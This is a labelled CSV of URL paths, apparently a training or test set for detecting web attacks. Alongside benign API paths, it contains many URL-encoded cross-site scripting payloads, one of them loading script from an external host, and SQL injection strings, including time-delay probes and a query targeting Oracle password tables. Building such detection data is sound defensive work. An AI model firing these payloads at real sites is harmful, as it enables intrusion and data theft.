text,label
/v1/search?q=%3Cdiv+id%3D%22100%22%3E%3Cimg%5Ba%5D%5Bb%5Dsrc%3Dx%5Bd%5Donerror%5Bc%5D%3D%5Be%5D%22alert%28100%29%22%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%22101%22%3E%3Ca+href%3D%22%5Ba%5Djava%5Bb%5Dscript%5Bc%5D%3Aalert%28101%29%22%3EXXX%3C%2Fa%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%22102%22%3E%3Cimg+src%3D%22x%60+%60%3Cscript%3Ealert%28102%29%3C%2Fscript%3E%22%60+%60%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%22103%22%3E%3Cscript%3Ehistory.pushState%280%2C0%2C%27%2Fi%2Fam%2Fsomewhere_else%27%29%3B%3C%2Fscript%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v1/feedback?message=%3Cmain+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fmain%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cxmp+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fxmp%3E,xss
/api/v2/items/47490?key=361265,benign
/api/v2/items/UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%23?key=API_KEY,sql_injection
/v1/profile?bio=%3Cs+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fs%3E,xss
/api/v1/users/946280,benign
/v1/search?q=%3Cdiv+id%3D%22131%22%3E%3Cb%3Edrag+and+drop+one+of+the+following+strings+to+the+drop+box%3A%3C%2Fb%3E,xss
/api/v2/profile?id=%3Ccite+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fcite%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cimg+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fimg%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cp+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fp%3E,xss
/api/v1/comments?text=%3Ccenter+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcenter%3E,xss
/api/v1/orders/597531,benign
/api/v1/comments?text=%3Cdatalist+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdatalist%3E,xss
/api/v1/comments?text=%3Clink+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Flink%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Ctd+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Ftd%3E,xss
/api/v1/feedback?message=%3Cbdo+onclick%3D%22alert%281%29%22%3Etest%3C%2Fbdo%3E,xss
/api/v1/reviews?body=%3Cframe+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fframe%3E,xss
/api/v1/users/905799,benign
/v1/orders?customer_id=%27%2CNULL%29%2520waifor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A&status=active,sql_injection
/v1/search?q=%3Cfigure+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ffigure%3E,xss
/v1/orders?customer_id=ORDER+BY+5--&status=active,sql_injection
/api/v1/reviews?body=%3Cnobr+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fnobr%3E,xss
/api/v2/profile?id=%3Cxmp+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fxmp%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cdatalist+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fdatalist%3E,xss
/api/v1/reviews?body=%3Clisting+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/api/v1/feedback?message=%3Csvg+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsvg%3E,xss
/api/v2/profile?id=%3Cmeter+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fmeter%3E,xss
/api/v1/login?username=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&password=pass,sql_injection
/v1/buckets/bucket-logs36/objects/file_87685.json,benign
/v1/search?q=%3Cdt+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fdt%3E,xss
/api/v1/cart?user_id=610611&action=view,benign
/api/v4/products/476783,benign
/api/v2/comments/%3Ciframe+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fiframe%3E,xss
/v1/products/%22%29%29%29%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523,sql_injection
/api/v1/users?id=%27%29%29%3Bwaitfor+delay+%270%3A0%3A5%27--,sql_injection
/api/v1/comments?text=%3Cheader+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fheader%3E,xss
/v1/products/UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL--,sql_injection
/api/v2/comments/%3Cxmp+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fxmp%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cem+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fem%3E,xss
/v1/buckets/bucket-images96/objects/file_41105.json,benign
/2010-04-01/Accounts/AC29114678669125177852892268018242/Messages.json,benign
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Coption+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Foption%3E,xss
/api/v1/feedback?message=%3Cdialog+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdialog%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ctrack+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Ftrack%3E,xss
/api/v1/search?q=%27+and+substring%28password%2Ftext%28%29%2C1%2C1%29%3D%277,sql_injection
/api/v1/reviews?body=%3Cmap+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fmap%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Ctr+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftr%3E%3Cinput+autofocus%3E,xss
/api/v1/profile?id=18720,benign
/v1/profile?bio=%3Cs+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fs%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cdl+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fdl%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbgsound+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fbgsound%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cbasefont+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fbasefont%3E,xss
/subscriptions/sub-15371/resourceGroups/rg-dev81/providers/Microsoft.CognitiveServices/accounts/acct2721,benign
/api/v1/feedback?message=%3Csup+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fsup%3E,xss
/api/v1/cart?user_id=830308&action=view,benign
/api/v2/users/27932,benign
/api/v1/reviews?body=%3Cscript%3E+document.getElementById%28%2522safe123%2522%29.click%3Dfunction%28%29%2B%7Balert%28Safe.get%28%29%29%3B%7D+document.getElementById%28%2522safe123%2522%29.click%28%7B%27type%27%3A%27click%27%2C%27isTrusted%27%3Atrue%7D%29%3B+%3C%2Fscript%3E,xss
/api/v2/search?q=834542&key=gaming+laptop,benign
/2015-03-31/functions/func_2648/invocations,benign
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Celement+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Felement%3E,xss
/v1/profile?bio=%3Cdata+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fdata%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cmenu+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fmenu%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cdt+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fdt%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Clegend+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Flegend%3E,xss
/v1/products/AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%29%29%23,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cu+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fu%3E,xss
/api/v1/comments?text=%3Ch1+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fh1%3E%3Cinput+autofocus%3E,xss
/subscriptions/sub-5165/resourceGroups/rg-prod12/providers/Microsoft.CognitiveServices/accounts/acct3682,benign
/api/v1/orders/cheap%2Bshoes,benign
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ccommand+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fcommand%3E,xss
/v1/products/ORDER+BY+24%23,sql_injection
/api/v1/comments?text=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E,xss
/api/v2/search?q=%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&key=API_KEY,sql_injection
/v1/profile?bio=%3Cnoscript+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoscript%3E,xss
/v1/profile?bio=%3Cnextid+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fnextid%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Ccode+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctemplate+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Ftemplate%3E,xss
/v1/profile?bio=%3Cu+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fu%3E,xss
/api/v2/comments/%3Cplaintext+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/v1/profile?bio=%3Cspacer+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspacer%3E,xss
/api/v2/comments/%3Cmulticol+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fmulticol%3E,xss
/v1/orders?customer_id=%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&status=active,sql_injection
/api/v1/orders?customer_id=679173,benign
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cacronym+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Facronym%3E,xss
/api/v1/search?q=AND+7506%3D9091+AND+%28%275913%3D5913,sql_injection
/api/v2/comments/%3Cslot+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fslot%3E,xss
/v1/orders?customer_id=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%29%29%23&status=active,sql_injection
/api/v2/items/107198?key=KEY-0001,benign
/api/v2/items/%22%29%29%29%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2F%2A?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Cbr+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbr%3E,xss
/2010-04-01/Accounts/AC58867533963605766270289517187026/Messages.json,benign
/api/v2/comments/%3Cspan+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fspan%3E,xss
/api/v1/reviews?body=%3Cnoembed+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fnoembed%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cbase+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fbase%3E,xss
/api/v1/cart?user_id=277881&action=view,benign
/api/v2/comments/%3Csource+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsource%3E,xss
/api/v2/profile?id=%3Ctextarea+oncopy%3Dalert%281%29+autofocus%3EXSS%3C%2Ftextarea%3E,xss
/api/v1/reviews?body=%3Ca+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fa%3E,xss
/api/v2/profile?id=%3Cif+expr%3D%22new+ActiveXObject%28%27htmlfile%27%29.parentWindow.alert%282%29%22%3E%3C%2Fif%3E,xss
/v1/profile?bio=%3Cprogress+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fprogress%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ckeygen+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fkeygen%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Coption+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Foption%3E,xss
/api/v1/feedback?message=%3Csvg%3E%3Cfigure+onload%3Dalert%281%29%3E%3C%2Ffigure%3E,xss
/api/v1/feedback?message=%3Cb+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fb%3E,xss
/v1/search?q=%3Ciframe+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fiframe%3E,xss
/v1/search?q=154257,benign
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ch1+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fh1%3E,xss
/subscriptions/sub-52856/resourceGroups/rg-staging19/providers/Microsoft.CognitiveServices/accounts/acct4439,benign
/api/v1/comments?text=%3Cstrong+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstrong%3E,xss
/api/v2/comments/%3Cstrike+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fstrike%3E,xss
/api/v1/comments?text=%3Cdetails+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fdetails%3E%3Cinput+autofocus%3E,xss
/api/v1/search?q=select,sql_injection
/v1/profile?bio=%3Cth+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fth%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Cstrong+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstrong%3E,xss
/api/v1/comments?text=%3Cdfn+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdfn%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cth+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fth%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cfont+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Ffont%3E,xss
/v1/search?q=%3Cstrong+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fstrong%3E,xss
/api/v1/search?q=AS+INJECTX+WHERE+1%3D1+AND+1%3D1%23,sql_injection
/api/v2/profile?id=%3Ci+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fi%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Chgroup+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fhgroup%3E,xss
/api/v1/login?username=%22%29%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29%2523&password=pass,sql_injection
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cstrong+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fstrong%3E,xss
/v1/orders?customer_id=ORDER+BY+23%23&status=active,sql_injection
/api/v1/cart?user_id=63942&action=view,benign
/v1/profile?bio=%3Cparam+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fparam%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Ch1+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fh1%3E,xss
/api/v2/search?q=%22%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&key=API_KEY,sql_injection
/v1/profile?bio=%3Cisindex+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fisindex%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cmenuitem+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fmenuitem%3E,xss
/api/v1/comments?text=%3Cmenu+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenu%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbasefont+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fbasefont%3E,xss
/api/v2/profile?id=%3Ctd+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ftd%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/search?q=%3Cdfn+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fdfn%3E,xss
/api/v1/feedback?message=%3Cu+onclick%3D%22alert%281%29%22%3Etest%3C%2Fu%3E,xss
/api/v2/profile?id=%3Csmall+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsmall%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cstrong+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fstrong%3E,xss
/api/v1/feedback?message=%3Ccode+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/api/v1/reviews?body=%3Cform+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fform%3E,xss
/api/v1/comments?text=%3Cu+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fu%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cmain+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fmain%3E,xss
/api/v2/comments/%3Ci+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fi%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ccenter+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fcenter%3E,xss
/api/v1/feedback?message=%3Cabbr+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fabbr%3E,xss
/v1/orders?customer_id=%2520%27sleep%252050%27&status=active,sql_injection
/api/v1/comments?text=%3Cselect+onfocusout%3Dalert%281%29+id%3Dx%3E%3C%2Fselect%3E%3Cinput+autofocus%3E,xss
/api/v1/search?q=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+COUNT%28DISTINCT%28PASSWORD%29%29+FROM+SYS.USER%24%29%29+AND+%27i%27%3D%27i,sql_injection
/api/v1/reviews?body=%3Cbdi+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbdi%3E,xss
/api/v1/comments?text=%3Cpicture+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpicture%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Chgroup+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fhgroup%3E,xss
/v1/buckets/bucket-images7/objects/file_76570.json,benign
/api/v1/reviews?body=%3Cbdo+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbdo%3E,xss
/api/v1/reviews?body=%22%3E%3Cscript+src%3Ddata%3A,xss
/api/v1/reviews?body=%3Crtc+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Frtc%3E,xss
/v1/profile?bio=%3Ctitle+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Ftitle%3E,xss
/api/v2/profile?id=%3Csvg%3E%3Carea+onload%3Dalert%281%29%3E%3C%2Farea%3E,xss
/v1/profile?bio=%3Csub+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fsub%3E,xss
/v1/search?q=%3Cimg+usemap%3D%23x%3E%3Cmap+name%3D%22x%22%3E%3Carea+href+onfocusin%3Dalert%281%29+id%3Dx%3E,xss
/api/v1/feedback?message=%3Ccenter+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fcenter%3E,xss
/api/v1/comments?text=%3Col+onclick%3D%22alert%281%29%22%3Etest%3C%2Fol%3E,xss
/api/v2/profile?id=%3Cx+contenteditable+onpaste%3Dalert%281%29%3Epaste+here%21,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ctitle+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Ftitle%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cmenu+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fmenu%3E,xss
/v1/products/%27%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29%2F%2A,sql_injection
/api/v2/comments/%3Ctr+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Ftr%3E,xss
/v1/profile?bio=%3Cprogress+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fprogress%3E,xss
/v1/profile?bio=%3Cembed+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fembed%3E,xss
/api/v2/comments/%3Cheader+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fheader%3E,xss
/api/v1/feedback?message=%3Cu+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fu%3E%3Cinput+autofocus%3E,xss
/api/v1/search?q=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%29%2520--,sql_injection
/api/v2/profile?id=%3Ctr+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Ftr%3E,xss
/api/v1/reviews?body=%3Cdiv+id%3D%22122%22%3E%3Ciframe+sandbox%3D%22allow-same-origin+allow-forms+allow-scripts%22+src%3D%22http%3A%2F%2Fexample.org%2F%22%3E%3C%2Fiframe%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v2/profile?id=%3Ciframe+onblur%3Dalert%281%29+id%3Dx%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Ctt+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Ftt%3E,xss
